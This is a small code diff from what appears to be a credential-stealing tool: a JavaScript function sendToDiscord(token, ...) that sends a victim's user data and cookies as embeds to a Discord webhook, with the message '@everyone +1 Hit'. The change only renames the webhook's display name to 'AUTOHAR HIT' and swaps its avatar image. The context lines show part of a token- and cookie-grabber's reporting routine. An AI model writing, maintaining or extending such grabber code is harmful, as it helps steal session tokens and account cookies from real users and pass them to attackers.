@@ -2242,8 +2242,8 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
       // Send both embeds together in a single message with @everyone notification
       const combinedPayload = {
         content: "@everyone +1 Hit",
-        username: "QNC",  // Custom webhook username
-        avatar_url: "https://i.imgur.com/Bszz5QR.jpeg",  // Custom webhook avatar
+        username: "AUTOHAR HIT",  // Custom webhook username
+        avatar_url: "https://i.imgur.com/rVUUJ9d.png",  // Custom webhook avatar
         embeds: [userDataEmbed, cookieEmbed]
       };
 
